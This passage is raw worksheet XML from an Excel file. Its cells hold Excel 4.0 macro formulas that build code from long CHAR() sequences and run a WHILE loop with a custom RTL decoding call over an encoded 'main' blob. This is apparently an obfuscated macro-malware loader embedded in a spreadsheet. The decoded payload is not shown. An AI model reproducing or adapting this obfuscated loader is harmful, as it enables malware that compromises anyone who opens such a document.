(93)&amp;CHAR(21)&amp;CHAR(172)&amp;CHAR(87)&amp;CHAR(148)&amp;CHAR(80)&amp;CHAR(25)&amp;CHAR(229)&amp;CHAR(220)&amp;CHAR(157)&amp;CHAR(119)&amp;CHAR(80)&amp;CHAR(184)&amp;CHAR(138)&amp;CHAR(115)&amp;CHAR(191)&amp;CHAR(13)&amp;CHAR(240)&amp;CHAR(194)&amp;CHAR(162)&amp;CHAR(105)&amp;CHAR(115)&amp;CHAR(241)&amp;CHAR(182)&amp;CHAR(242)&amp;CHAR(76)&amp;CHAR(160)&amp;CHAR(85)&amp;CHAR(76)&amp;CHAR(252)&amp;CHAR(143)&amp;CHAR(137)&amp;CHAR(45)&amp;CHAR(143)&amp;CHAR(49)&amp;CHAR(33)&amp;CHAR(86)&amp;CHAR(249)&amp;CHAR(159)&amp;CHAR(20)&amp;CHAR(84)&amp;CHAR(149)&amp;CHAR(180)&amp;CHAR(12)&amp;CHAR(114)&amp;CHAR(112)&amp;CHAR(32)&amp;CHAR(95)&amp;CHAR(18)&amp;CHAR(187)&amp;CHAR(116)&amp;CHAR(105)&amp;CHAR(198)&amp;CHAR(148)&amp;CHAR(19)&amp;CHAR(116)&amp;CHAR(240)&amp;CHAR(76)&amp;CHAR(179)&amp;CHAR(152)&amp;CHAR(141)&amp;CHAR(14)&amp;CHAR(69)&amp;CHAR(255)&amp;CHAR(53)&amp;CHAR(81)&amp;CHAR(87)&amp;CHAR(126)&amp;CHAR(201)&amp;CHAR(80)&amp;CHAR(90)&amp;CHAR(215)&amp;CHAR(145)&amp;CHAR(106)&amp;CHAR(81)&amp;CHAR(190)&amp;CHAR(72)&amp;CHAR(119)&amp;CHAR(48)&amp;CHAR(216)&amp;CHAR(78)&amp;CHAR(76)&amp;CHAR(71)&amp;CHAR(70)&amp;CHAR(158)&amp;CHAR(7)&amp;CHAR(79)&amp;CHAR(175)&amp;CHAR(216)&amp;CHAR(116)&amp;CHAR(171)&amp;CHAR(137)&amp;CHAR(165)&amp;CHAR(255)&amp;CHAR(248)&amp;CHAR(153)&amp;CHAR(144)&amp;CHAR(2)&amp;CHAR(92)&amp;CHAR(197)&amp;CHAR(240)&amp;CHAR(191)&amp;CHAR(94)&amp;CHAR(12)&amp;CHAR(81)&amp;CHAR(146)&amp;CHAR(70)&amp;CHAR(87)&amp;CHAR(29)&amp;CHAR(134)&amp;CHAR(227)&amp;CHAR(37)&amp;CHAR(169)</f>
        <v>_x0003_"¢FDéÿï_x001A_¢üwˆU¹b®._x0002_ºv_x0011_î_x0019_x:lŠ$¡¯ü_x0012_Ùª¹/}nZ¬_x0011__x0005_²Å$%ÿ_x0004_Ó=q(Ä_x000B_–
ãFåIF
_x000B_GN
_x0004_GV¹_x001A_r—®K…ýy]z-Òƒ4²6Ôê,_x0010__x001B_²C½Ã¥]U:/Ã4OMj‚_x0005_/u_x0008_á_x0005_³_x000D_—re™¨:ÉˆbSÌÙI€(Š_x0010__x001F_HH_x001D_ÉÅ]_x0015_¬W”P_x0019_åÜwP¸Šs¿_x000D_ðÂ¢isñ¶òL ULü‰-1!VùŸ_x0014_T•´_x000C_rp __x0012_»tiÆ”_x0013_tðL³˜_x000E_Eÿ5QW~ÉPZ×‘jQ¾Hw0ØNLGFž_x0007_O¯Øt«‰¥ÿø™_x0002_\Åð¿^_x000C_Q’FW_x001D_†ã%©</v>
      </c>
      <c r="DG31" t="str">
        <f>CHAR(119)&amp;CHAR(97)&amp;CHAR(100)&amp;CHAR(155)&amp;CHAR(236)&amp;CHAR(118)&amp;CHAR(185)&amp;CHAR(77)&amp;CHAR(215)&amp;CHAR(144)</f>
        <v>wad›ìv¹M×</v>
      </c>
      <c r="DH31" t="s">
        <v>30</v>
      </c>
      <c r="DJ31" t="b">
        <f>SET.VALUE($DI$1,0)</f>
        <v>1</v>
      </c>
    </row>
    <row r="32" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE32" t="b">
        <f>FORMULA(DH65&amp;DH49&amp;DH34&amp;DH35&amp;DH38&amp;DH31&amp;DH66&amp;DH13&amp;DH1&amp;DH9&amp;DH14&amp;DH69&amp;DH70&amp;DH68&amp;DH31&amp;DH50&amp;DH29&amp;DH31&amp;DH38&amp;DH68&amp;DH67,DJ32)</f>
        <v>1</v>
      </c>
      <c r="DF32" t="str">
        <f>CHAR(198)&amp;CHAR(252)&amp;CHAR(71)&amp;CHAR(180)&amp;CHAR(12)&amp;CHAR(251)&amp;CHAR(79)&amp;CHAR(69)&amp;CHAR(235)&amp;CHAR(231)&amp;CHAR(185)&amp;CHAR(33)&amp;CHAR(202)&amp;CHAR(30)&amp;CHAR(217)&amp;CHAR(144)&amp;CHAR(49)&amp;CHAR(248)&amp;CHAR(33)&amp;CHAR(255)&amp;CHAR(107)&amp;CHAR(158)&amp;CHAR(166)&amp;CHAR(208)&amp;CHAR(108)&amp;CHAR(170)&amp;CHAR(107)&amp;CHAR(114)&amp;CHAR(35)&amp;CHAR(45)&amp;CHAR(65)&amp;CHAR(122)&amp;CHAR(18)&amp;CHAR(137)&amp;CHAR(40)&amp;CHAR(59)&amp;CHAR(68)&amp;CHAR(235)&amp;CHAR(150)&amp;CHAR(105)&amp;CHAR(134)&amp;CHAR(138)&amp;CHAR(246)&amp;CHAR(49)&amp;CHAR(149)&amp;CHAR(154)&amp;CHAR(146)&amp;CHAR(155)&amp;CHAR(21)&amp;CHAR(7)&amp;CHAR(6)&amp;CHAR(152)&amp;CHAR(203)&amp;CHAR(77)&amp;CHAR(218)&amp;CHAR(82)&amp;CHAR(118)&amp;CHAR(175)&amp;CHAR(119)&amp;CHAR(27)&amp;CHAR(37)&amp;CHAR(94)&amp;CHAR(142)&amp;CHAR(58)&amp;CHAR(49)&amp;CHAR(122)&amp;CHAR(245)&amp;CHAR(74)&amp;CHAR(53)&amp;CHAR(59)&amp;CHAR(128)&amp;CHAR(51)&amp;CHAR(52)&amp;CHAR(157)&amp;CHAR(253)&amp;CHAR(130)&amp;CHAR(238)&amp;CHAR(26)&amp;CHAR(223)&amp;CHAR(79)&amp;CHAR(254)&amp;CHAR(142)&amp;CHAR(51)&amp;CHAR(221)&amp;CHAR(56)&amp;CHAR(75)&amp;CHAR(200)&amp;CHAR(90)&amp;CHAR(32)&amp;CHAR(133)&amp;CHAR(14)&amp;CHAR(65)&amp;CHAR(17)&amp;CHAR(1)&amp;CHAR(66)&amp;CHAR(234)&amp;CHAR(209)&amp;CHAR(176)&amp;CHAR(77)&amp;CHAR(79)&amp;CHAR(221)&amp;CHAR(163)&amp;CHAR(123)&amp;CHAR(234)&amp;CHAR(54)&amp;CHAR(96)&amp;CHAR(151)&amp;CHAR(108)&amp;CHAR(33)&amp;CHAR(239)&amp;CHAR(126)&amp;CHAR(50)&amp;CHAR(15)&amp;CHAR(217)&amp;CHAR(165)&amp;CHAR(220)&amp;CHAR(153)&amp;CHAR(64)&amp;CHAR(230)&amp;CHAR(134)&amp;CHAR(155)&amp;CHAR(98)&amp;CHAR(157)&amp;CHAR(240)&amp;CHAR(197)&amp;CHAR(60)&amp;CHAR(155)&amp;CHAR(133)&amp;CHAR(207)&amp;CHAR(41)&amp;CHAR(196)&amp;CHAR(29)&amp;CHAR(234)&amp;CHAR(160)&amp;CHAR(216)&amp;CHAR(24)&amp;CHAR(158)&amp;CHAR(104)&amp;CHAR(160)&amp;CHAR(208)&amp;CHAR(40)&amp;CHAR(209)&amp;CHAR(172)&amp;CHAR(42)&amp;CHAR(142)&amp;CHAR(82)&amp;CHAR(39)&amp;CHAR(104)&amp;CHAR(18)&amp;CHAR(74)&amp;CHAR(132)&amp;CHAR(123)&amp;CHAR(200)&amp;CHAR(193)&amp;CHAR(246)&amp;CHAR(121)&amp;CHAR(203)&amp;CHAR(236)&amp;CHAR(169)&amp;CHAR(66)&amp;CHAR(190)&amp;CHAR(109)&amp;CHAR(141)&amp;CHAR(224)&amp;CHAR(159)&amp;CHAR(233)&amp;CHAR(225)&amp;CHAR(245)&amp;CHAR(238)&amp;CHAR(253)&amp;CHAR(52)&amp;CHAR(149)&amp;CHAR(164)&amp;CHAR(202)&amp;CHAR(233)&amp;CHAR(98)&amp;CHAR(33)&amp;CHAR(36)&amp;CHAR(110)&amp;CHAR(94)&amp;CHAR(192)&amp;CHAR(60)&amp;CHAR(25)&amp;CHAR(81)&amp;CHAR(190)&amp;CHAR(139)&amp;CHAR(6)&amp;CHAR(119)&amp;CHAR(45)&amp;CHAR(88)&amp;CHAR(222)&amp;CHAR(191)&amp;CHAR(109)&amp;CHAR(42)&amp;CHAR(28)&amp;CHAR(44)&amp;CHAR(30)&amp;CHAR(54)&amp;CHAR(134)&amp;CHAR(252)&amp;CHAR(89)&amp;CHAR(11)&amp;CHAR(188)&amp;CHAR(111)&amp;CHAR(27)&amp;CHAR(157)&amp;CHAR(72)&amp;CHAR(18)&amp;CHAR(231)&amp;CHAR(76)&amp;CHAR(147)&amp;CHAR(196)&amp;CHAR(195)&amp;CHAR(223)&amp;CHAR(176)&amp;CHAR(234)&amp;CHAR(206)&amp;CHAR(122)&amp;CHAR(219)&amp;CHAR(43)&amp;CHAR(25)&amp;CHAR(196)&amp;CHAR(174)&amp;CHAR(64)&amp;CHAR(141)&amp;CHAR(135)&amp;CHAR(32)&amp;CHAR(48)&amp;CHAR(3)&amp;CHAR(40)&amp;CHAR(163)&amp;CHAR(231)&amp;CHAR(23)&amp;CHAR(23)&amp;CHAR(119)&amp;CHAR(51)&amp;CHAR(43)&amp;CHAR(24)&amp;CHAR(31)&amp;CHAR(143)&amp;CHAR(118)&amp;CHAR(114)&amp;CHAR(137)&amp;CHAR(150)&amp;CHAR(3)&amp;CHAR(214)&amp;CHAR(135)&amp;CHAR(125)&amp;CHAR(133)&amp;CHAR(123)&amp;CHAR(29)&amp;CHAR(162)&amp;CHAR(144)&amp;CHAR(18)&amp;CHAR(13)</f>
        <v>ÆüG´_x000C_ûOEëç¹!Ê_x001E_Ù1ø!ÿkž¦Ðlªkr#-Az_x0012_‰(;Dë–i†Šö1•š’›_x0015__x0007__x0006_˜ËMÚRv¯w_x001B_%^Ž:1zõJ5;€34ý‚î_x001A_ßOþŽ3Ý8KÈZ …_x000E_A_x0011__x0001_BêÑ°MOÝ£{ê6`—l!ï~2_x000F_Ù¥Ü™@æ†›bðÅ&lt;›…Ï)Ä_x001D_ê Ø_x0018_žh Ð(Ñ¬*ŽR'h_x0012_J„{ÈÁöyËì©B¾màŸéáõîý4•¤Êéb!$n^À&lt;_x0019_Q¾‹_x0006_w-XÞ¿m*_x001C_,_x001E_6†üY_x000B_¼o_x001B_H_x0012_çL“ÄÃß°êÎzÛ+_x0019_Ä®@‡ 0_x0003_(£ç_x0017__x0017_w3+_x0018__x001F_vr‰–_x0003_Ö‡}…{_x001D_¢_x0012__x000D_</v>
      </c>
      <c r="DG32" t="str">
        <f>CHAR(102)&amp;CHAR(207)&amp;CHAR(157)&amp;CHAR(11)&amp;CHAR(182)&amp;CHAR(88)&amp;CHAR(247)&amp;CHAR(185)&amp;CHAR(210)&amp;CHAR(233)</f>
        <v>fÏ_x000B_¶X÷¹Òé</v>
      </c>
      <c r="DH32" t="s">
        <v>31</v>
      </c>
      <c r="DJ32" t="b">
        <f>WHILE(main&lt;&gt;"EXCEL")</f>
        <v>1</v>
      </c>
    </row>
    <row r="33" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE33" t="b">
        <f>FORMULA(DH65&amp;DH45&amp;DH31&amp;DH46&amp;DH71&amp;DH48&amp;DH27&amp;DH38&amp;DH47&amp;DH31&amp;DH66&amp;DH44&amp;DH55&amp;DH29&amp;DH54&amp;DH54&amp;DH56&amp;DH76&amp;DH38&amp;DH31&amp;DH40&amp;DH66&amp;DH13&amp;DH1&amp;DH9&amp;DH14&amp;DH67&amp;DH67,DJ33)</f>
        <v>1</v>
      </c>
      <c r="DF33" t="str">
        <f>CHAR(177)&amp;CHAR(233)&amp;CHAR(19)&amp;CHAR(43)&amp;CHAR(76)&amp;CHAR(89)&amp;CHAR(178)&amp;CHAR(42)&amp;CHAR(219)&amp;CHAR(146)&amp;CHAR(171)&amp;CHAR(109)&amp;CHAR(104)&amp;CHAR(166)&amp;CHAR(108)&amp;CHAR(38)&amp;CHAR(131)&amp;CHAR(140)&amp;CHAR(198)&amp;CHAR(79)&amp;CHAR(138)&amp;CHAR(69)&amp;CHAR(122)&amp;CHAR(149)&amp;CHAR(78)&amp;CHAR(123)&amp;CHAR(218)&amp;CHAR(184)&amp;CHAR(133)&amp;CHAR(198)&amp;CHAR(166)&amp;CHAR(241)&amp;CHAR(205)&amp;CHAR(215)&amp;CHAR(20)&amp;CHAR(219)&amp;CHAR(220)&amp;CHAR(58)&amp;CHAR(119)&amp;CHAR(71)&amp;CHAR(169)&amp;CHAR(88)&amp;CHAR(75)&amp;CHAR(237)&amp;CHAR(168)&amp;CHAR(255)&amp;CHAR(93)&amp;CHAR(220)&amp;CHAR(7)&amp;CHAR(240)&amp;CHAR(4)&amp;CHAR(205)&amp;CHAR(3)&amp;CHAR(43)&amp;CHAR(100)&amp;CHAR(128)&amp;CHAR(119)&amp;CHAR(4)&amp;CHAR(219)&amp;CHAR(200)&amp;CHAR(249)&amp;CHAR(172)&amp;CHAR(125)&amp;CHAR(115)&amp;CHAR(231)&amp;CHAR(102)&amp;CHAR(196)&amp;CHAR(253)&amp;CHAR(21)&amp;CHAR(136)&amp;CHAR(178)&amp;CHAR(196)&amp;CHAR(27)&amp;CHAR(9)&amp;CHAR(194)&amp;CHAR(194)&amp;CHAR(1)&amp;CHAR(101)&amp;CHAR(107)&amp;CHAR(78)&amp;CHAR(58)&amp;CHAR(202)&amp;CHAR(204)&amp;CHAR(46)&amp;CHAR(101)&amp;CHAR(111)&amp;CHAR(93)&amp;CHAR(100)&amp;CHAR(211)&amp;CHAR(22)&amp;CHAR(111)&amp;CHAR(76)&amp;CHAR(25)&amp;CHAR(11)&amp;CHAR(248)&amp;CHAR(213)&amp;CHAR(185)&amp;CHAR(25)&amp;CHAR(227)&amp;CHAR(155)&amp;CHAR(209)&amp;CHAR(71)&amp;CHAR(202)&amp;CHAR(232)&amp;CHAR(24)&amp;CHAR(198)&amp;CHAR(104)&amp;CHAR(245)&amp;CHAR(177)&amp;CHAR(123)&amp;CHAR(44)&amp;CHAR(244)&amp;CHAR(167)&amp;CHAR(192)&amp;CHAR(193)&amp;CHAR(141)&amp;CHAR(249)&amp;CHAR(69)&amp;CHAR(27)&amp;CHAR(201)&amp;CHAR(225)&amp;CHAR(62)&amp;CHAR(154)&amp;CHAR(102)&amp;CHAR(38)&amp;CHAR(21)&amp;CHAR(62)&amp;CHAR(79)&amp;CHAR(255)&amp;CHAR(51)&amp;CHAR(65)&amp;CHAR(140)&amp;CHAR(254)&amp;CHAR(109)&amp;CHAR(67)&amp;CHAR(163)&amp;CHAR(90)&amp;CHAR(88)&amp;CHAR(185)&amp;CHAR(152)&amp;CHAR(5)&amp;CHAR(143)&amp;CHAR(101)&amp;CHAR(121)&amp;CHAR(112)&amp;CHAR(2)&amp;CHAR(27)&amp;CHAR(44)&amp;CHAR(35)&amp;CHAR(160)&amp;CHAR(153)&amp;CHAR(96)&amp;CHAR(77)&amp;CHAR(230)&amp;CHAR(175)&amp;CHAR(155)&amp;CHAR(248)&amp;CHAR(75)&amp;CHAR(2)&amp;CHAR(102)&amp;CHAR(73)&amp;CHAR(235)&amp;CHAR(136)&amp;CHAR(175)&amp;CHAR(74)&amp;CHAR(23)&amp;CHAR(56)&amp;CHAR(205)&amp;CHAR(7)&amp;CHAR(228)&amp;CHAR(239)&amp;CHAR(159)&amp;CHAR(2)&amp;CHAR(224)&amp;CHAR(86)&amp;CHAR(91)&amp;CHAR(143)&amp;CHAR(123)&amp;CHAR(111)&amp;CHAR(79)&amp;CHAR(176)&amp;CHAR(92)&amp;CHAR(173)&amp;CHAR(94)&amp;CHAR(89)&amp;CHAR(127)&amp;CHAR(43)&amp;CHAR(211)&amp;CHAR(224)&amp;CHAR(61)&amp;CHAR(195)&amp;CHAR(67)&amp;CHAR(242)&amp;CHAR(172)&amp;CHAR(192)&amp;CHAR(149)&amp;CHAR(175)&amp;CHAR(43)&amp;CHAR(253)&amp;CHAR(112)&amp;CHAR(144)&amp;CHAR(113)&amp;CHAR(82)&amp;CHAR(179)&amp;CHAR(162)&amp;CHAR(181)&amp;CHAR(91)&amp;CHAR(173)&amp;CHAR(158)&amp;CHAR(99)&amp;CHAR(170)&amp;CHAR(11)&amp;CHAR(28)&amp;CHAR(70)&amp;CHAR(25)&amp;CHAR(87)&amp;CHAR(170)&amp;CHAR(200)&amp;CHAR(141)&amp;CHAR(140)&amp;CHAR(61)&amp;CHAR(75)&amp;CHAR(2)&amp;CHAR(121)&amp;CHAR(14)&amp;CHAR(19)&amp;CHAR(63)&amp;CHAR(254)&amp;CHAR(45)&amp;CHAR(165)&amp;CHAR(76)&amp;CHAR(150)&amp;CHAR(35)&amp;CHAR(184)&amp;CHAR(31)&amp;CHAR(197)&amp;CHAR(163)&amp;CHAR(68)&amp;CHAR(207)&amp;CHAR(252)&amp;CHAR(9)&amp;CHAR(87)&amp;CHAR(127)&amp;CHAR(72)&amp;CHAR(227)&amp;CHAR(175)&amp;CHAR(160)&amp;CHAR(149)&amp;CHAR(124)&amp;CHAR(68)&amp;CHAR(25)&amp;CHAR(11)&amp;CHAR(160)&amp;CHAR(12)&amp;CHAR(145)</f>
        <v>±é_x0013_+LY²*Û’«mh¦l&amp;ƒŒÆOŠEz•N{Ú¸…Æ¦ñÍ×_x0014_ÛÜ:wG©XKí¨ÿ]Ü_x0007_ð_x0004_Í_x0003_+d€w_x0004_ÛÈù¬}sçfÄý_x0015_ˆ²Ä_x001B_	ÂÂ_x0001_ekN:ÊÌ.eo]dÓ_x0016_oL_x0019__x000B_øÕ¹_x0019_ã›ÑGÊè_x0018_Æhõ±{,ô§ÀÁùE_x001B_Éá&gt;šf&amp;_x0015_&gt;Oÿ3AŒþmC£ZX¹˜_x0005_eyp_x0002__x001B_,# ™`Mæ¯›øK_x0002_fIëˆ¯J_x0017_8Í_x0007_äïŸ_x0002_àV[{oO°\­^Y+Óà=ÃCò¬À•¯+ýpqR³¢µ[­žcª_x000B__x001C_F_x0019_WªÈŒ=K_x0002_y_x000E__x0013_?þ-¥L–#¸_x001F_Å£DÏü	WHã¯ •|D_x0019__x000B_ _x000C_‘</v>
      </c>
      <c r="DG33" t="str">
        <f>CHAR(251)&amp;CHAR(243)&amp;CHAR(48)&amp;CHAR(216)&amp;CHAR(88)&amp;CHAR(26)&amp;CHAR(22)&amp;CHAR(155)&amp;CHAR(153)&amp;CHAR(134)</f>
        <v>ûó0ØX_x001A__x0016_›™†</v>
      </c>
      <c r="DH33" t="s">
        <v>32</v>
      </c>
      <c r="DJ33" t="b">
        <f>SET.VALUE($DI$2,LEN(main))</f>
        <v>1</v>
      </c>
    </row>
    <row r="34" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE34" t="b">
        <f>FORMULA(DH65&amp;DH44&amp;DH46&amp;DH38&amp;DH66&amp;DH44&amp;DH55&amp;DH55&amp;DH29&amp;DH54&amp;DH54&amp;DH57&amp;DH72&amp;DH66&amp;DH44&amp;DH54&amp;DH29&amp;DH54&amp;DH54&amp;DH56&amp;DH73&amp;DH54&amp;DH53&amp;DH67&amp;DH76&amp;DH13&amp;DH1&amp;DH9&amp;DH14&amp;DH76&amp;DH38&amp;DH31&amp;DH40&amp;DH66&amp;DH13&amp;DH1&amp;DH9&amp;DH14&amp;DH67&amp;DH67,DJ34)</f>
        <v>1</v>
      </c>
      <c r="DF34" t="str">
        <f>CHAR(24)&amp;CHAR(67)&amp;CHAR(54)&amp;CHAR(154)&amp;CHAR(39)&amp;CHAR(209)&amp;CHAR(146)&amp;CHAR(39)&amp;CHAR(52)&amp;CHAR(88)&amp;CHAR(28)&amp;CHAR(92)&amp;CHAR(208)&amp;CHAR(55)&amp;CHAR(47)&amp;CHAR(28)&amp;CHAR(215)&amp;CHAR(108)&amp;CHAR(194)&amp;CHAR(59)&amp;CHAR(149)&amp;CHAR(18)&amp;CHAR(222)&amp;CHAR(168)&amp;CHAR(36)&amp;CHAR(229)&amp;CHAR(209)&amp;CHAR(213)&amp;CHAR(156)&amp;CHAR(228)&amp;CHAR(134)&amp;CHAR(104)&amp;CHAR(213)&amp;CHAR(209)&amp;CHAR(168)&amp;CHAR(26)&amp;CHAR(216)&amp;CHAR(30)&amp;CHAR(206)&amp;CHAR(213)&amp;CHAR(84)&amp;CHAR(24)&amp;CHAR(11)&amp;CHAR(1)&amp;CHAR(132)&amp;CHAR(152)&amp;CHAR(25)&amp;CHAR(26)&amp;CHAR(217)&amp;CHAR(94)&amp;CHAR(213)&amp;CHAR(250)&amp;CHAR(189)&amp;CHAR(210)&amp;CHAR(147)&amp;CHAR(250)&amp;CHAR(7)&amp;CHAR(141)&amp;CHAR(126)&amp;CHAR(83)&amp;CHAR(84)&amp;CHAR(24)&amp;CHAR(14)&amp;CHAR(65)&amp;CHAR(231)&amp;CHAR(123)&amp;CHAR(190)&amp;CHAR(144)&amp;CHAR(72)&amp;CHAR(14)&amp;CHAR(119)&amp;CHAR(114)&amp;CHAR(232)&amp;CHAR(146)&amp;CHAR(8)&amp;CHAR(142)&amp;CHAR(34)&amp;CHAR(183)&amp;CHAR(54)&amp;CHAR(67)&amp;CHAR(53)&amp;CHAR(224)&amp;CHAR(24)&amp;CHAR(33)&amp;CHAR(77)&amp;CHAR(192)&amp;CHAR(145)&amp;CHAR(139)&amp;CHAR(101)&amp;CHAR(34)&amp;CHAR(100)&amp;CHAR(154)&amp;CHAR(14)&amp;CHAR(28)&amp;CHAR(20)&amp;CHAR(12)&amp;CHAR(252)&amp;CHAR(146)&amp;CHAR(46)&amp;CHAR(37)&amp;CHAR(214)&amp;CHAR(30)&amp;CHAR(9)&amp;CHAR(23)&amp;CHAR(78)&amp;CHAR(18)&amp;CHAR(25)&amp;CHAR(90)&amp;CHAR(6)&amp;CHAR(136)&amp;CHAR(120)&amp;CHAR(102)&amp;CHAR(83)&amp;CHAR(108)&amp;CHAR(119)&amp;CHAR(125)&amp;CHAR(177)&amp;CHAR(27)&amp;CHAR(134)&amp;CHAR(232)&amp;CHAR(234)&amp;CHAR(143)&amp;CHAR(54)&amp;CHAR(163)&amp;CHAR(180)&amp;CHAR(52)&amp;CHAR(202)&amp;CHAR(193)&amp;CHAR(112)&amp;CHAR(237)&amp;CHAR(133)&amp;CHAR(8)&amp;CHAR(65)&amp;CHAR(91)&amp;CHAR(95)&amp;CHAR(13)&amp;CHAR(94)&amp;CHAR(190)&amp;CHAR(205)&amp;CHAR(143)&amp;CHAR(89)&amp;CHAR(151)&amp;CHAR(139)&amp;CHAR(149)&amp;CHAR(118)&amp;CHAR(28)&amp;CHAR(28)&amp;CHAR(160)&amp;CHAR(120)&amp;CHAR(132)&amp;CHAR(9)&amp;CHAR(203)&amp;CHAR(15)&amp;CHAR(152)&amp;CHAR(107)&amp;CHAR(224)&amp;CHAR(231)&amp;CHAR(231)&amp;CHAR(75)&amp;CHAR(196)&amp;CHAR(44)&amp;CHAR(247)&amp;CHAR(93)&amp;CHAR(60)&amp;CHAR(205)&amp;CHAR(151)&amp;CHAR(240)&amp;CHAR(59)&amp;CHAR(219)&amp;CHAR(236)&amp;CHAR(4)&amp;CHAR(105)&amp;CHAR(31)&amp;CHAR(62)&amp;CHAR(207)&amp;CHAR(111)&amp;CHAR(58)&amp;CHAR(235)&amp;CHAR(209)&amp;CHAR(194)&amp;CHAR(136)&amp;CHAR(240)&amp;CHAR(190)&amp;CHAR(75)&amp;CHAR(50)&amp;CHAR(162)&amp;CHAR(110)&amp;CHAR(238)&amp;CHAR(56)&amp;CHAR(146)&amp;CHAR(224)&amp;CHAR(40)&amp;CHAR(60)&amp;CHAR(215)&amp;CHAR(3)&amp;CHAR(77)&amp;CHAR(106)&amp;CHAR(182)&amp;CHAR(26)&amp;CHAR(208)&amp;CHAR(110)&amp;CHAR(117)&amp;CHAR(16)&amp;CHAR(26)&amp;CHAR(219)&amp;CHAR(215)&amp;CHAR(209)&amp;CHAR(198)&amp;CHAR(88)&amp;CHAR(176)&amp;CHAR(142)&amp;CHAR(74)&amp;CHAR(151)&amp;CHAR(170)&amp;CHAR(84)&amp;CHAR(247)&amp;CHAR(209)&amp;CHAR(180)&amp;CHAR(161)&amp;CHAR(245)&amp;CHAR(29)&amp;CHAR(102)&amp;CHAR(139)&amp;CHAR(71)&amp;CHAR(29)&amp;CHAR(72)&amp;CHAR(89)&amp;CHAR(130)&amp;CHAR(30)&amp;CHAR(139)&amp;CHAR(42)&amp;CHAR(137)&amp;CHAR(25)&amp;CHAR(254)&amp;CHAR(10)&amp;CHAR(235)&amp;CHAR(74)&amp;CHAR(75)&amp;CHAR(4)&amp;CHAR(236)&amp;CHAR(224)&amp;CHAR(122)&amp;CHAR(10)&amp;CHAR(79)&amp;CHAR(191)&amp;CHAR(132)&amp;CHAR(34)&amp;CHAR(189)&amp;CHAR(230)&amp;CHAR(164)&amp;CHAR(70)&amp;CHAR(80)&amp;CHAR(124)&amp;CHAR(109)&amp;CHAR(251)</f>
        <v>_x0018_C6š'Ñ’'4X_x001C_\Ð7/_x001C_×lÂ;•_x0012_Þ¨$åÑÕœä†hÕÑ¨_x001A_Ø_x001E_ÎÕT_x0018__x000B__x0001_„˜_x0019__x001A_Ù^Õú½Ò“ú_x0007_~ST_x0018__x000E_Aç{¾H_x000E_wrè’_x0008_Ž"·6C5à_x0018_!MÀ‘‹e"dš_x000E__x001C__x0014__x000C_ü’.%Ö_x001E_	_x0017_N_x0012__x0019_Z_x0006_ˆxfSlw}±_x001B_†èê6£´4ÊÁpí…_x0008_A[__x000D_^¾ÍY—‹•v_x001C__x001C_ x„	Ë_x000F_˜kàççKÄ,÷]&lt;Í—ð;Ûì_x0004_i_x001F_&gt;Ïo:ëÑÂˆð¾K2¢nî8’à(&lt;×_x0003_Mj¶_x001A_Ðnu_x0010__x001A_Û×ÑÆX°ŽJ—ªT÷Ñ´¡õ_x001D_f‹G_x001D_HY‚_x001E_‹*‰_x0019_þ
ëJK_x0004_ìàz
O¿„"½æ¤FP|mû</v>
      </c>
      <c r="DG34" t="str">
        <f>CHAR(135)&amp;CHAR(245)&amp;CHAR(89)&amp;CHAR(85)&amp;CHAR(223)&amp;CHAR(155)&amp;CHAR(241)&amp;CHAR(238)&amp;CHAR(139)&amp;CHAR(131)</f>
        <v>‡õYUß›ñî‹ƒ</v>
      </c>
      <c r="DH34" t="s">
        <v>33</v>
      </c>
      <c r="DJ34">
        <f>RTL($DJ$22+($DI$1*10),main,LEN(main))</f>
        <v>1342183270</v>
      </c>
    </row>
    <row r="35" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE35" t="b">
        <f>FORMULA(DH65&amp;DH45&amp;DH31&amp;DH46&amp;DH71&amp;DH48&amp;DH27&amp;DH38&amp;DH47&amp;DH31&amp;DH66&amp;DH44&amp;DH54&amp;DH29&amp;DH54&amp;DH54&amp;DH56&amp;DH76&amp;DH44&amp;DH54&amp;DH29&amp;DH54&amp;DH54&amp;DH56&amp;DH72&amp;DH54&amp;DH67,DJ35)</f>
        <v>1</v>
      </c>
      <c r="DF35" t="str">
        <f>CHAR(146)&amp;CHAR(182)&amp;CHAR(209)&amp;CHAR(19)&amp;CHAR(129)&amp;CHAR(211)&amp;CHAR(81)&amp;CHAR(47)&amp;CHAR(99)&amp;CHAR(253)&amp;CHAR(164)&amp;CHAR(156)&amp;CHAR(1)&amp;CHAR(114)&amp;CHAR(95)&amp;CHAR(222)&amp;CHAR(143)&amp;CHAR(19)&amp;CHAR(72)&amp;CHAR(209)&amp;CHAR(130)&amp;CHAR(31)&amp;CHAR(4)&amp;CHAR(111)&amp;CHAR(92)&amp;CHAR(40)&amp;CHAR(66)&amp;CHAR(33)&amp;CHAR(74)&amp;CHAR(164)&amp;CHAR(59)&amp;CHAR(8)&amp;CHAR(53)&amp;CHAR(59)&amp;CHAR(77)&amp;CHAR(2)&amp;CHAR(174)&amp;CHAR(178)&amp;CHAR(186)&amp;CHAR(118)&amp;CHAR(55)&amp;CHAR(32)&amp;CHAR(207)&amp;CHAR(194)&amp;CHAR(205)&amp;CHAR(230)&amp;CHAR(99)&amp;CHAR(90)&amp;CHAR(18)&amp;CHAR(63)&amp;CHAR(41)&amp;CHAR(247)&amp;CHAR(158)&amp;CHAR(232)&amp;CHAR(19)&amp;CHAR(99)&amp;CHAR(157)&amp;CHAR(181)&amp;CHAR(67)&amp;CHAR(52)&amp;CHAR(109)&amp;CHAR(5)&amp;CHAR(74)&amp;CHAR(100)&amp;CHAR(132)&amp;CHAR(102)&amp;CHAR(48)&amp;CHAR(162)&amp;CHAR(196)&amp;CHAR(25)&amp;CHAR(204)&amp;CHAR(43)&amp;CHAR(28)&amp;CHAR(162)&amp;CHAR(201)&amp;CHAR(42)&amp;CHAR(183)&amp;CHAR(206)&amp;CHAR(36)&amp;CHAR(126)&amp;CHAR(129)&amp;CHAR(122)&amp;CHAR(162)&amp;CHAR(20)&amp;CHAR(177)&amp;CHAR(113)&amp;CHAR(162)&amp;CHAR(24)&amp;CHAR(44)&amp;CHAR(84)&amp;CHAR(114)&amp;CHAR(220)&amp;CHAR(94)&amp;CHAR(134)&amp;CHAR(99)&amp;CHAR(111)&amp;CHAR(56)&amp;CHAR(214)&amp;CHAR(181)&amp;CHAR(243)&amp;CHAR(225)&amp;CHAR(114)&amp;CHAR(16)&amp;CHAR(5)&amp;CHAR(54)&amp;CHAR(1)&amp;CHAR(245)&amp;CHAR(10)&amp;CHAR(37)&amp;CHAR(3